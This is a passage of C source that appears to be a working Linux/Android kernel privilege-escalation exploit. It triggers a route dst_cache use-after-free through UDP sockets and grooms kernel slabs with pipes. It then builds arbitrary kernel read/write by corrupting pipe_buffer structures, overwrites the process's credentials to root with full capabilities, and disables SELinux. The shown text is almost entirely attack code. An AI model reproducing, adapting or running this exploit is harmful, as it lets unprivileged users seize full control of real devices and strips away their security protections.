    usize cpus = min_usize(online_cpu_count(), MAX_GROOM_CPUS);
    if (cpus <= 1 || !env_usize("BAD_DST_SMP_GROOM", 1)) {
        return;
    }

    usize cmsg_churn = env_usize("BAD_DST_GROOM_CHURN_CMSG_PER_CPU", 32);
    usize pipe_churn = env_usize("BAD_DST_GROOM_CHURN_PIPE192_PER_CPU", 48);
    usize cmsg_hold = env_usize("BAD_DST_GROOM_HOLD_CMSG_PER_CPU", 8);
    usize pipe_hold = env_usize("BAD_DST_GROOM_HOLD_PIPE192_PER_CPU", 4);

    LOG("SMP groom: cpus=%lu cmsg_churn=%lu pipe192_churn=%lu cmsg_hold=%lu pipe192_hold=%lu",
        cpus, cmsg_churn, pipe_churn, cmsg_hold, pipe_hold);

    churn_cmsg_partials_per_cpu(cpus, cmsg_churn);
    churn_pipe192_partials_per_cpu(cpus, pipe_churn);
    hold_pipe192_active_slabs_per_cpu(cpus, pipe_hold);
    hold_cmsg_active_slabs_per_cpu(cpus, cmsg_hold);
}

void churn_kmalloc192_after_rtable_free() {
    usize online_cpus = min_usize(online_cpu_count(), MAX_GROOM_CPUS);
    usize cpus = env_usize("BAD_DST_POST_RTABLE_CHURN_CPUS", 1);
    cpus = min_usize(cpus, online_cpus);
    usize per_cpu = env_usize(
        "BAD_DST_POST_RTABLE_CHURN_PIPE192_PER_CPU",
        online_cpus > 1 ? 128 : 0);
    usize rounds = env_usize("BAD_DST_POST_RTABLE_CHURN_ROUNDS", online_cpus > 1 ? 2 : 0);

    if (per_cpu == 0 || rounds == 0) {
        return;
    }

    LOG("post-rtable kmalloc-192 churn: cpus=%lu rounds=%lu pipe192_per_cpu=%lu",
        cpus, rounds, per_cpu);
    trace_marker("attempt=%lu stage=post_rtable_churn_start cpus=%lu rounds=%lu pipe192=%lu",
        trace_marker_attempt, cpus, rounds, per_cpu);

    for (usize round = 0; round < rounds; round++) {
        churn_pipe192_partials_per_cpu(cpus, per_cpu);
        trace_marker("attempt=%lu stage=post_rtable_churn_round round=%lu",
            trace_marker_attempt, round);
    }

    trace_marker("attempt=%lu stage=post_rtable_churn_done", trace_marker_attempt);
}

void pin_irqs_to_cpu0_if_requested() {
    if (online_cpu_count() <= 1 || !env_usize("BAD_DST_PIN_IRQS_CPU0", 1)) {
        return;
    }

    LOG("pinning IRQ affinities to CPU0");
    system("echo 1 > /proc/irq/default_smp_affinity 2>/dev/null");
    system("for f in /proc/irq/*/smp_affinity; do echo 1 > \"$f\" 2>/dev/null; done");
}

void *page_reclaim_thread(void *arg) {
    PageReclaimArg *reclaim = (PageReclaimArg *) arg;
    pin_to_cpu(reclaim->cpu);

    for (usize i = reclaim->start; i < reclaim->end; i++) {
        SYSCHK(write(reclaim->pipes[i].write_fd, reclaim->buf, 0x1000));
    }

    return NULL;
}

void reclaim_pipe_pages(Pipe *page_pipes, usize pipe_count, u8 *buf) {
    usize cpus = min_usize(online_cpu_count(), MAX_GROOM_CPUS);
    if (cpus <= 1 || !env_usize("BAD_DST_PAGE_RECLAIM_PERCPU", 1)) {
        for (usize i = 0; i < pipe_count; i++) {
            SYSCHK(write(page_pipes[i].write_fd, buf, 0x1000));
        }
        return;
    }

    usize cpu0_pct = env_usize("BAD_DST_PAGE_RECLAIM_CPU0_PCT", 100);
    if (cpu0_pct > 100) {
        cpu0_pct = 100;
    }

    PageReclaimArg args[MAX_GROOM_CPUS] = { 0 };
    pthread_t threads[MAX_GROOM_CPUS] = { 0 };
    usize thread_count = 0;
    usize offset = 0;

    usize cpu0_count = (pipe_count * cpu0_pct) / 100;
    if (cpu0_count != 0) {
        args[thread_count] = (PageReclaimArg) {
            .pipes = page_pipes,
            .start = 0,
            .end = cpu0_count,
            .cpu = 0,
            .buf = buf,
        };
        pthread_create_or_die(&threads[thread_count], page_reclaim_thread, &args[thread_count]);
        thread_count++;
        offset = cpu0_count;
    }

    usize remaining_cpus = cpus - (cpu0_count != 0 ? 1 : 0);
    if (remaining_cpus == 0 && offset < pipe_count) {
        remaining_cpus = 1;
    }

    for (usize i = 0; offset < pipe_count && i < remaining_cpus; i++) {
        usize cpu = cpu0_count != 0 ? i + 1 : i;
        usize remaining_pipes = pipe_count - offset;
        usize remaining_workers = remaining_cpus - i;
        usize count = (remaining_pipes + remaining_workers - 1) / remaining_workers;

        args[thread_count] = (PageReclaimArg) {
            .pipes = page_pipes,
            .start = offset,
            .end = offset + count,
            .cpu = (int) cpu,
            .buf = buf,
        };
        pthread_create_or_die(&threads[thread_count], page_reclaim_thread, &args[thread_count]);
        thread_count++;
        offset += count;
    }

    for (usize i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
}

// spins until socket has error
int wait_for_socket_error(int socket_fd) {
    for (;;) {
        int error = 0;
        socklen_t len = sizeof(error);
        SYSCHK(getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &error, &len));
        if (error != 0) {
            return error;
        }
    }
}

#define PEER_ADDR "192.168.10.1"

int open_connected_ipv4_udp_socket(const char *address_str, short port) {
    int socket_fd = SYSCHK(socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP));

    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    SYSCHK(inet_pton(AF_INET, address_str, &addr.sin_addr));

    SYSCHK(connect(socket_fd, (struct sockaddr*)&addr, sizeof(addr)));

    return socket_fd;
}

int open_vuln_ipv4_udp_socket() {
    int socket_fd = open_connected_ipv4_udp_socket(PEER_ADDR, 6767);

    // setting this mode means packets are always sent as non fragmentable
    int mode = IP_PMTUDISC_DO;
    SYSCHK(setsockopt(socket_fd, IPPROTO_IP, IP_MTU_DISCOVER, &mode, sizeof(mode)));

    // do send to trigger actual icmp packet to arrive and get dst_cache in a state where it can be freed
    // this should be below mtu limit server will send
    // this doesn't seem to matter, and still puts the socket in the right state to trigger later free
    u8 buf[256] = { 0 };
    SYSCHK(send(socket_fd, buf, sizeof(buf), 0));
    assert(wait_for_socket_error(socket_fd) == EMSGSIZE);

    return socket_fd;
}

void trigger_expired_fnhe_cleanup(bool lookup_only) {
    int socket_fd = lookup_only ?
        open_connected_ipv4_udp_socket(PEER_ADDR, 6767) :
        open_vuln_ipv4_udp_socket();

    SYSCHK(close(socket_fd));
}

// broadcast socket only has 1 ref for its rtinfo
int open_broadcst_socket() {
    int socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
    int one = 1;
    SYSCHK(setsockopt(socket_fd, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one)));

    struct sockaddr_in bcast = {
        .sin_family = AF_INET,
        .sin_port = htons(6767),
    };
    inet_pton(AF_INET, "192.168.10.255", &bcast.sin_addr);

    SYSCHK(connect(socket_fd, (struct sockaddr *)&bcast, sizeof(bcast)));

    return socket_fd;

    // idt needed?
    // send(socket_a, "A", 1, 0);   // populate sk_dst_cache
}

void open_many_sockets(int *fd_array, usize len) {
    for (usize i = 0; i < len; i++) {
        fd_array[i] = open_broadcst_socket();
    }
}

void close_fds(int *fd_array, usize len) {
    for (usize i = 0; i < len; i++) {
        SYSCHK(close(fd_array[i]));
    }
}


/////////////////////////////
//// Addr / Leak Utils   ////
/////////////////////////////

#ifdef __x86_64__
#define VMEMMAP_START 0xffffea0000000000
#define LINEAR_BASE 0xffff888000000000
#define PHYS_BASE 0x1000000
#else
#define VMEMMAP_START 0xfffffffeffe00000
#define LINEAR_BASE 0xffffff8000000000
#define PHYS_BASE 0x200000
#endif

#define STEXT 0xffffffff81000000
#define PAGE_OFFSET_BASE (0xffffffff82c92910 - STEXT)
#define PIPE_OPS_OFFSET (0xffffffff827bf740 - STEXT)
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define INIT_TASK_OFFSET (0xffffffff83415940 - STEXT)

#define TASK_SCAN_LIMIT 65536
#define TASK_LAYOUT_SCAN_SIZE 0x2000
#define ROOT_COMM_MARKER "bdstroot"

usize vmem_base = 0;
usize kaslr_base = 0;
usize phys_base = 0;
usize linear_base = 0;

usize addr_to_page(usize addr) {
  return ((addr >> 12) << 6) + vmem_base;
}

usize is_linear_address(usize addr) {
  return (addr & 0xffff000000000000) == 0xffff000000000000;
}

usize is_kernel_address(usize addr) {
  return (addr & 0xffffffc000000000) == 0xffffffc000000000;
}


/////////////////////////////
//// Pipe Buffer R/W     ////
/////////////////////////////

struct pipe_buffer_t {
  unsigned long page;
  unsigned int offset, len;
  unsigned long ops;
  unsigned long flag;
  unsigned long private;
};

typedef struct {
    Pipe exp_pipe;
    Pipe exp_page_pipe;
    usize pipe_page_offset;
    struct pipe_buffer_t pipe_buffer_leak;
} RwContext;

RwContext global_rw_context = { 0 };

unsigned long read64(usize addr) {
    if ((addr & 0xfff) + 8 > 0x1000) {
        panic("invalid read");
        return 0;
    }

    u8 buffer[0x1000] = { 0 };
    SYSCHK(read(global_rw_context.exp_page_pipe.read_fd, buffer, sizeof(buffer)));

    memset(buffer, 'D', 0x1000);
    struct pipe_buffer_t *pipe_buffer = (struct pipe_buffer_t *) (&buffer[global_rw_context.pipe_page_offset]);

    memcpy(pipe_buffer, &global_rw_context.pipe_buffer_leak, sizeof(struct pipe_buffer_t));

    pipe_buffer->page = addr_to_page(addr);
    pipe_buffer->len = 9;
    pipe_buffer->offset = addr & 0xfff;
    for (usize i = 1; i < 4; i++) {
        memcpy(pipe_buffer + i, pipe_buffer, 40);
    }

    // overwrite pipe_buffer
    SYSCHK(write(global_rw_context.exp_page_pipe.write_fd, buffer, sizeof(buffer)));

    // now do the read memory
    usize data;
    SYSCHK(read(global_rw_context.exp_pipe.read_fd, &data, sizeof(data)));
    return data;
}

void write64(usize addr, usize data) {
    assert((addr & 0xfff) + 8 <= 0x1000);

    u8 buffer[0x1000] = { 0 };
    SYSCHK(read(global_rw_context.exp_page_pipe.read_fd, buffer, sizeof(buffer)));

    memset(buffer, 'D', 0x1000);
    struct pipe_buffer_t *pipe_buffer = (struct pipe_buffer_t *) (&buffer[global_rw_context.pipe_page_offset]);

    memcpy(pipe_buffer, &global_rw_context.pipe_buffer_leak, sizeof(struct pipe_buffer_t));

    pipe_buffer->page = addr_to_page(addr);
    pipe_buffer->len = 0;
    pipe_buffer->offset = addr & 0xfff;
    for (usize i = 1; i < 4; i++) {
        memcpy(pipe_buffer + i, pipe_buffer, 40);
    }

    // overwrite pipe_buffer
    SYSCHK(write(global_rw_context.exp_page_pipe.write_fd, buffer, sizeof(buffer)));

    // now do the write of memory
    SYSCHK(write(global_rw_context.exp_pipe.write_fd, &data, sizeof(data)));
}

usize read64_kernel(usize addr) {
    return read64(addr - kaslr_base + phys_base);
}

void write64_kernel(usize addr, usize data) {
    write64(addr - kaslr_base + phys_base, data);
}

usize read64_virtual(usize addr) {
    // return read64(addr - 0xffff888000000000);
    return read64(addr - linear_base);
}

void write64_virtual(usize addr, usize data) {
    // return write64(addr - 0xffff888000000000, data);
    return write64(addr - linear_base, data);
}

usize read64_all(usize addr) {
    if (is_kernel_address(addr)) {
        return read64_kernel(addr);
    } else {
        return read64_virtual(addr);
    }
}

void write64_all(usize addr, usize data) {
    if (is_kernel_address(addr)) {
        write64_kernel(addr, data);
    } else {
        write64_virtual(addr, data);
    }
}

void read_mem(usize addr, usize *data, usize size) {
    for (int i=0; i<size/8; i++) {
        data[i] = read64(addr+i*8);
    }
}

void write_mem(usize addr, usize *data, usize size) {
    for (int i=0; i<size/8; i++) {
        write64(addr+i*8, data[i]);
    }
}

bool pipe_buffer_leak_looks_usable(struct pipe_buffer_t *pipe_buffer) {
    usize kaslr_candidate = pipe_buffer->ops - PIPE_OPS_OFFSET;

    if (!is_linear_address(pipe_buffer->page)) {
        return false;
    }
    if (!is_kernel_address(pipe_buffer->ops)) {
        return false;
    }
    if (!is_kernel_address(kaslr_candidate) || (kaslr_candidate & 0xfff) != 0) {
        return false;
    }
    if (pipe_buffer->offset >= 0x1000 || pipe_buffer->len > 0x1000) {
        return false;
    }

    return true;
}

bool pipe_buffer_probe_looks_usable(struct pipe_buffer_t *pipe_buffer,
                                    usize probe_len) {
    if (!pipe_buffer_leak_looks_usable(pipe_buffer)) {
        return false;
    }
    if (pipe_buffer->offset != 0 || pipe_buffer->len != probe_len) {
        return false;
    }
    if (((u32) pipe_buffer->flag & PIPE_BUF_FLAG_CAN_MERGE) == 0) {
        return false;
    }

    return true;
}

bool prior_pipe_slots_look_reclaimed(const u8 *buffer, usize base_offset,
                                     usize active_slots_before_probe) {
    if (!env_usize("BAD_DST_REQUIRE_RECLAIMED_PREV_PIPE_SLOTS", 1)) {
        return true;
    }

    for (usize slot = 0; slot < active_slots_before_probe; slot++) {
        usize offset = base_offset + slot * sizeof(struct pipe_buffer_t);
        const struct pipe_buffer_t *pipe_buffer =
            (const struct pipe_buffer_t *) (buffer + offset);

        if (pipe_buffer->page != 0x4141414141414141 ||
            pipe_buffer->len != 0x41414141 ||
            pipe_buffer->ops != 0x4141414141414141) {
            return false;
        }
    }

    return true;
}

bool find_pipe_buffer_probe(const u8 *buffer, usize size, usize probe_len,
                            usize active_slots_before_probe,
                            usize *base_offset,
                            usize *probe_offset,
                            struct pipe_buffer_t *pipe_buffer_leak) {
    usize probe_delta = active_slots_before_probe * sizeof(struct pipe_buffer_t);

    if (size < sizeof(struct pipe_buffer_t) ||
        probe_delta + 4 * sizeof(struct pipe_buffer_t) > size) {
        return false;
    }

    for (usize offset = 0; offset + sizeof(struct pipe_buffer_t) <= size;
         offset += sizeof(usize)) {
        struct pipe_buffer_t candidate = { 0 };
        memcpy(&candidate, buffer + offset, sizeof(candidate));

        if (!pipe_buffer_probe_looks_usable(&candidate, probe_len)) {
            continue;
        }
        if (offset < probe_delta) {
            continue;
        }

        usize candidate_base = offset - probe_delta;
        if (candidate_base + 4 * sizeof(struct pipe_buffer_t) > size) {
            continue;
        }
        if (!prior_pipe_slots_look_reclaimed(buffer, candidate_base,
                                             active_slots_before_probe)) {
            continue;
        }

        *base_offset = candidate_base;
        *probe_offset = offset;
        *pipe_buffer_leak = candidate;
        return true;
    }

    return false;
}

void scan_kernel_phys_base() {
    // scanning did not work for some reason
    phys_base = env_usize("BAD_DST_PHYS_BASE", PHYS_BASE);
    // phys_base = 0;
    // for (;;) {
    //   usize value = read64(phys_base + 0x38);
    //   if (!memcmp(&phys_base, "ARMd", 4)) {
    //     break;
    //   }

    //   phys_base += 0x1000;
    // }
}

typedef struct {
    usize tasks_offset;
    usize cred_offset;
    usize real_cred_offset;
    usize comm_offset;
} TaskLayout;

bool is_probable_task_or_list_pointer(usize addr) {
    return is_linear_address(addr) && !is_kernel_address(addr);
}

bool env_task_layout(TaskLayout *layout) {
    usize tasks_offset = env_usize("BAD_DST_TASKS_OFFSET", (usize)-1);
    usize cred_offset = env_usize("BAD_DST_CRED_OFFSET", (usize)-1);
    usize comm_offset = env_usize("BAD_DST_COMM_OFFSET", (usize)-1);
    usize real_cred_offset = env_usize(
        "BAD_DST_REAL_CRED_OFFSET",
        cred_offset == (usize)-1 ? (usize)-1 : cred_offset - 8);

    if (tasks_offset == (usize)-1 ||
        cred_offset == (usize)-1 ||
        comm_offset == (usize)-1 ||
        real_cred_offset == (usize)-1) {
        return false;
    }

    layout->tasks_offset = tasks_offset;
    layout->cred_offset = cred_offset;
    layout->real_cred_offset = real_cred_offset;
    layout->comm_offset = comm_offset;
    LOG("task layout from env: tasks=0x%lx real_cred=0x%lx cred=0x%lx comm=0x%lx",
        layout->tasks_offset,
        layout->real_cred_offset,
        layout->cred_offset,
        layout->comm_offset);
    return true;
}

void read_task_comm(usize task, usize comm_offset, char comm[17]) {
    memset(comm, 0, 17);
    usize lo = read64_all(task + comm_offset);
    usize hi = read64_all(task + comm_offset + 8);
    memcpy(comm, &lo, sizeof(lo));
    memcpy(comm + 8, &hi, sizeof(hi));
    comm[16] = '\0';
}

bool discover_task_layout(TaskLayout *layout) {
    if (env_task_layout(layout)) {
        return true;
    }

    usize init_task = kaslr_base + INIT_TASK_OFFSET;
    memset(layout, 0, sizeof(*layout));

    for (usize i = 0; i < TASK_LAYOUT_SCAN_SIZE - 16; i += 8) {
        usize value = read64_kernel(init_task + i);
        usize value2 = read64_kernel(init_task + i + 8);

        char possible_comm[17] = { 0 };
        memcpy(possible_comm, &value, sizeof(value));
        memcpy(possible_comm + 8, &value2, sizeof(value2));
        if (layout->comm_offset == 0 &&
            !strncmp(possible_comm, "swapper/", 8)) {
            layout->comm_offset = i;
            layout->cred_offset = i - 0x10;
            layout->real_cred_offset = i - 0x18;
            LOG("discovered task comm offset: 0x%lx", layout->comm_offset);
        }

        if (layout->tasks_offset == 0 &&
            is_probable_task_or_list_pointer(value) &&
            is_probable_task_or_list_pointer(value2)) {
            usize prev_ptr = read64_all(value + 8);
            if (prev_ptr == init_task + i) {
                layout->tasks_offset = i;
                LOG("discovered task list offset: 0x%lx", layout->tasks_offset);
            }
        }

        if (layout->tasks_offset != 0 && layout->comm_offset != 0) {
            LOG("task layout: tasks=0x%lx real_cred=0x%lx cred=0x%lx comm=0x%lx",
                layout->tasks_offset,
                layout->real_cred_offset,
                layout->cred_offset,
                layout->comm_offset);
            return true;
        }
    }

    LOG("FAIL: could not discover task layout tasks=0x%lx comm=0x%lx",
        layout->tasks_offset, layout->comm_offset);
    return false;
}

bool set_root_comm_marker(void) {
    if (prctl(PR_SET_NAME, ROOT_COMM_MARKER, 0, 0, 0) == -1) {
        LOG("failed to set comm marker with prctl: errno=%d", errno);
        return false;
    }
    return true;
}

bool find_current_task(TaskLayout *layout, usize *task_out) {
    usize init_task = kaslr_base + INIT_TASK_OFFSET;
    usize current_task = init_task;

    for (usize i = 0; i < TASK_SCAN_LIMIT; i++) {
        usize next = read64_all(current_task + layout->tasks_offset);
        usize next_task = next - layout->tasks_offset;
        if (next_task == init_task || next_task == current_task) {
            break;
        }
        current_task = next_task;

        char comm[17] = { 0 };
        read_task_comm(current_task, layout->comm_offset, comm);
        if (!strcmp(comm, ROOT_COMM_MARKER)) {
            *task_out = current_task;
            LOG("found current task: 0x%lx", current_task);
            return true;
        }
    }

    LOG("FAIL: could not find task with comm marker %s", ROOT_COMM_MARKER);
    return false;
}

void overwrite_cred_to_root(usize cred) {
    LOG("overwriting cred at: 0x%lx", cred);

    // uid, gid, suid, sgid, euid, egid, fsuid, fsgid
    write64_all(cred + 0x04, 0);
    write64_all(cred + 0x0c, 0);
    write64_all(cred + 0x14, 0);
    write64_all(cred + 0x1c, 0);

    // securebits
    write64_all(cred + 0x24, 0);

    if (env_usize("BAD_DST_SET_CAPS", 1)) {
        usize full_caps = ~(usize)0;
        write64_all(cred + 0x28, full_caps); // cap_inheritable
        write64_all(cred + 0x30, full_caps); // cap_permitted
        write64_all(cred + 0x38, full_caps); // cap_effective
        write64_all(cred + 0x40, full_caps); // cap_bset
        write64_all(cred + 0x48, full_caps); // cap_ambient
        LOG("capability sets overwritten");
    }
}

void disable_selinux_if_configured(void) {
#ifdef BAD_DST_NO_SELINUX
    LOG("SELinux disable compiled out");
    return;
#else
    if (!env_usize("BAD_DST_DISABLE_SELINUX", 1)) {
        LOG("SELinux disable skipped by BAD_DST_DISABLE_SELINUX=0");
        return;
    }

    usize write_addr = env_usize("BAD_DST_SELINUX_WRITE_ADDR", 0);
    if (write_addr != 0) {
        LOG("disabling SELinux using exact write addr: 0x%lx", write_addr);
        write64_all(write_addr, 0);
        return;
    }

#ifdef SELINUX_ENFORCING_OFFSET
    LOG("disabling SELinux enforcing at offset: 0x%lx", (usize)SELINUX_ENFORCING_OFFSET);
    write64_kernel(kaslr_base + SELINUX_ENFORCING_OFFSET, 0);
    return;
#endif

#ifdef SELINUX_STATE_OFFSET
    LOG("disabling SELinux state at offset: 0x%lx", (usize)SELINUX_STATE_OFFSET);
    // Android targets often provide the selinux_state symbol/field such that
    // writing at -7 zeros the one-byte enforcing flag without requiring a
    // byte-write primitive.
    write64_kernel(kaslr_base + SELINUX_STATE_OFFSET - 7, 0);
    return;
#endif

    LOG("SELinux disable requested but no SELinux offset/address is configured");
#endif
}

bool get_root(void) {
    if (!set_root_comm_marker()) {
        return false;
    }

    TaskLayout layout = { 0 };
    if (!discover_task_layout(&layout)) {
        return false;
    }

    usize current_task = 0;
    if (!find_current_task(&layout, &current_task)) {
        return false;
    }

    usize real_cred = read64_all(current_task + layout.real_cred_offset);
    usize cred = read64_all(current_task + layout.cred_offset);
    LOG("current task creds: real_cred=0x%lx cred=0x%lx", real_cred, cred);

    if (real_cred == 0 || cred == 0) {
        LOG("FAIL: invalid cred pointer");
        return false;
    }

    overwrite_cred_to_root(cred);
    if (real_cred != cred) {
        overwrite_cred_to_root(real_cred);
    }

    syscall(SYS_setresgid, 0, 0, 0);
    syscall(SYS_setresuid, 0, 0, 0);
    setgid(0);
    setuid(0);

    disable_selinux_if_configured();

    LOG("now uid/gid/euid/egid: %d/%d/%d/%d",
        getuid(), getgid(), geteuid(), getegid());
    return getuid() == 0 && geteuid() == 0;
}


/////////////////////////////
//// Trigger Logic       ////
/////////////////////////////


#define DEFAULT_PAGE_PIPES 0x600
#define MAX_PAGE_PIPES 0xc00
#define DEFAULT_VULN_PIPES 0x20
#define MAX_VULN_PIPES 0x40
#define MAX_LEAKED_VULN_PIPES 0x2000
#define MAX_CPU1_BLOCK_THREADS 1024
#define NUM_BASE_PRE_SOCKETS 1792
#define NUM_ALIGN_PAD_SOCKETS 21
#define NUM_PRE_SOCKETS (NUM_BASE_PRE_SOCKETS + NUM_ALIGN_PAD_SOCKETS)
#define NUM_POST_SOCKETS 256

typedef struct {
    Pipe pipe;
    int index;
    int size;
    bool leaked;
} CorruptPipeCandidate;

typedef struct {
    Pipe page_pipes[MAX_PAGE_PIPES];
    Pipe vuln_pipes[MAX_VULN_PIPES];
    usize page_pipe_count;
    usize vuln_pipe_count;
    bool page_pipes_active;
    bool vuln_pipes_active;
    bool active;
} ExploitPipeSet;

Pipe leaked_vuln_pipes[MAX_LEAKED_VULN_PIPES] = { 0 };
bool leaked_vuln_pipe_ignored[MAX_LEAKED_VULN_PIPES] = { 0 };
usize leaked_vuln_pipe_count = 0;

ssize_t remember_leaked_vuln_pipes(Pipe *pipes, usize count) {
    usize max_leaked = env_usize("BAD_DST_MAX_LEAKED_VULN_PIPES", MAX_LEAKED_VULN_PIPES);
    max_leaked = min_usize(max_leaked, MAX_LEAKED_VULN_PIPES);

    if (leaked_vuln_pipe_count >= max_leaked) {
        LOG("leaked vuln pipe registry full (%lu); pausing to avoid untracked corrupted pipe close",
            leaked_vuln_pipe_count);
        while (1) {
            sleep(1000);
        }
    }

    usize room = max_leaked - leaked_vuln_pipe_count;
    usize to_store = min_usize(count, room);
    usize first = leaked_vuln_pipe_count;

    for (usize i = 0; i < to_store; i++) {
        leaked_vuln_pipes[leaked_vuln_pipe_count] = pipes[i];
        leaked_vuln_pipe_ignored[leaked_vuln_pipe_count] = false;
        leaked_vuln_pipe_count++;
    }

    LOG("remembered leaked vuln pipes: added=%lu total=%lu",
        to_store, leaked_vuln_pipe_count);

    if (to_store != count) {
        LOG("leaked vuln pipe registry overflow after partial store; pausing");
        while (1) {
            sleep(1000);
        }
    }

    return (ssize_t) first;
}

void ignore_leaked_vuln_pipe_index(int index) {
    if (index < 0 || (usize) index >= leaked_vuln_pipe_count) {
        return;
    }

    leaked_vuln_pipe_ignored[index] = true;
    LOG("ignoring stale leaked vuln pipe index=%d", index);
}

usize configured_page_pipe_count() {
    bool smp = online_cpu_count() > 1;
    return min_usize(
        env_usize("BAD_DST_PAGE_PIPES", smp ? MAX_PAGE_PIPES : DEFAULT_PAGE_PIPES),
        MAX_PAGE_PIPES);
}

usize configured_vuln_pipe_count() {
    bool smp = online_cpu_count() > 1;
    return min_usize(
        env_usize("BAD_DST_VULN_PIPES", smp ? MAX_VULN_PIPES : DEFAULT_VULN_PIPES),
        MAX_VULN_PIPES);
}

void close_pipe_array(Pipe *pipes, usize count) {
    for (usize i = 0; i < count; i++) {
        pipe_close(&pipes[i]);
    }
}

bool exploit_pipe_set_has_active(ExploitPipeSet *pipes) {
    return pipes &&
        (pipes->active || pipes->page_pipes_active || pipes->vuln_pipes_active);
}

void ensure_exploit_pipe_counts(ExploitPipeSet *pipes) {
    if (pipes->page_pipe_count == 0) {
        pipes->page_pipe_count = configured_page_pipe_count();
    }
    if (pipes->vuln_pipe_count == 0) {
        pipes->vuln_pipe_count = configured_vuln_pipe_count();
    }
}

void prepare_page_pipes(ExploitPipeSet *pipes) {
    if (pipes->page_pipes_active) {
        return;
    }

    ensure_exploit_pipe_counts(pipes);
    LOG("prepare page pipes... page=%lu", pipes->page_pipe_count);
    trace_marker("attempt=%lu stage=prepare_page_pipes page=%lu",
        trace_marker_attempt, pipes->page_pipe_count);

    // setup page pipes to have 1 pipe buffer entry with 1 backing page, but
    // don't prefault the backing page yet.
    for (usize i = 0; i < pipes->page_pipe_count; i++) {
        pipes->page_pipes[i] = open_pipe();
        pipe_set_buf_size(&pipes->page_pipes[i], 0x1000);
    }

    pipes->page_pipes_active = true;
    pipes->active = pipes->page_pipes_active && pipes->vuln_pipes_active;
}

void prepare_vuln_pipes(ExploitPipeSet *pipes) {
    if (pipes->vuln_pipes_active) {
        return;
    }

    ensure_exploit_pipe_counts(pipes);
    LOG("prepare vuln pipes... vuln=%lu", pipes->vuln_pipe_count);
    trace_marker("attempt=%lu stage=prepare_vuln_pipes vuln=%lu",
        trace_marker_attempt, pipes->vuln_pipe_count);

    // Initially put vuln pipes in the smaller ring. Each one keeps exactly one
    // unread byte so the later resize copies one active pipe_buffer slot.
    for (usize i = 0; i < pipes->vuln_pipe_count; i++) {
        pipes->vuln_pipes[i] = open_pipe();
        pipe_set_buf_size(&pipes->vuln_pipes[i], 0x1000);
        pipe_write_one_active_buffer(&pipes->vuln_pipes[i]);
    }
    verify_vuln_pipes_active(pipes->vuln_pipes, pipes->vuln_pipe_count, "initial setup");

    pipes->vuln_pipes_active = true;
    pipes->active = pipes->page_pipes_active && pipes->vuln_pipes_active;
}

void prepare_exploit_pipes(ExploitPipeSet *pipes) {
    if (pipes->active) {
        return;
    }

    ensure_exploit_pipe_counts(pipes);
    LOG("prepare pipes... page=%lu vuln=%lu",
        pipes->page_pipe_count, pipes->vuln_pipe_count);
    trace_marker("attempt=%lu stage=prepare_pipes page=%lu vuln=%lu",
        trace_marker_attempt, pipes->page_pipe_count, pipes->vuln_pipe_count);

    prepare_page_pipes(pipes);
    prepare_vuln_pipes(pipes);
}

void close_prepared_exploit_pipes(ExploitPipeSet *pipes, bool leak_vuln, const char *reason) {
    if (!exploit_pipe_set_has_active(pipes)) {
        return;
    }

    LOG("discard prepared pipes at %s leak_vuln=%d", reason, leak_vuln);
    if (pipes->page_pipes_active) {
        close_pipe_array(pipes->page_pipes, pipes->page_pipe_count);
    }
    if (leak_vuln && pipes->vuln_pipes_active) {
        remember_leaked_vuln_pipes(pipes->vuln_pipes, pipes->vuln_pipe_count);
    } else if (pipes->vuln_pipes_active) {
        close_pipe_array(pipes->vuln_pipes, pipes->vuln_pipe_count);
    }
    pipes->active = false;
    pipes->page_pipes_active = false;
    pipes->vuln_pipes_active = false;
}

bool find_corrupted_pipe_in_set(Pipe *pipes, usize count, usize corrupt_min,
                                const char *source, bool leaked,
                                CorruptPipeCandidate *candidate) {
    for (usize i = 0; i < count; i++) {
        if (leaked && leaked_vuln_pipe_ignored[i]) {
            continue;
        }

        int size = 0;
        if (!pipe_readable_bytes(&pipes[i], &size)) {
            LOG("FIONREAD failed for %s vuln pipe index=%lu errno=%d",
                source, i, errno);
            if (leaked) {
                ignore_leaked_vuln_pipe_index((int) i);
            }
            continue;
        }

        if ((unsigned int) size >= corrupt_min) {
            candidate->pipe = pipes[i];
            candidate->index = (int) i;
            candidate->size = size;
            candidate->leaked = leaked;
            return true;
        }
    }

    return false;
}

bool find_corrupted_pipe(Pipe *current_pipes, usize current_count,
                         usize corrupt_min, CorruptPipeCandidate *candidate) {
    if (find_corrupted_pipe_in_set(current_pipes, current_count, corrupt_min,
                                   "current", false, candidate)) {
        return true;
    }

    if (leaked_vuln_pipe_count == 0) {
        return false;
    }

    return find_corrupted_pipe_in_set(leaked_vuln_pipes, leaked_vuln_pipe_count,
                                      corrupt_min, "leaked", true, candidate);
}

typedef struct {
    atomic_int ready_counter;
    atomic_int cpu1_block;
    atomic_int cpu1_blocker_ready_counter;
    // atomic_int timer_wakeup;
    int timer_fd;
    atomic_int vuln_socket;
    int pre_sockets[NUM_PRE_SOCKETS];
    int post_sockets[NUM_POST_SOCKETS];
    usize pre_socket_count;
    usize post_socket_count;
    usize align_pad;
    atomic_int trigger_thread;
    atomic_int trigger_done_counter;
    Pipe sync_pipe_to_trigger;
    u64 timer_offset;
    u64 critical_start_ns;
} TriggerCtx;

typedef struct {
    TriggerCtx *ctx;
    usize index;
} Cpu1BlockerArg;

bool cpu1_block_futex_enabled() {
    return env_usize("BAD_DST_CPU1_BLOCK_FUTEX", 0) ? true : false;
}

void wake_cpu1_blockers(TriggerCtx *ctx) {
    if (!cpu1_block_futex_enabled()) {
        return;
    }

    (void) syscall(
        SYS_futex,
        (int *) &ctx->cpu1_block,
        FUTEX_WAKE_PRIVATE,
        INT_MAX,
        NULL,
        NULL,
        0);
}

void set_cpu1_block_state(TriggerCtx *ctx, int block) {
    atomic_store(&ctx->cpu1_block, block);
    if (block) {
        wake_cpu1_blockers(ctx);
    }
}

void wait_cpu1_blocker_released(TriggerCtx *ctx) {
    if (!cpu1_block_futex_enabled()) {
        sleep_us_checked(env_usize("BAD_DST_CPU1_RELEASE_SLEEP_US", 1000));
        return;
    }

    while (!atomic_load(&ctx->cpu1_block)) {
        int rc = (int) syscall(
            SYS_futex,
            (int *) &ctx->cpu1_block,
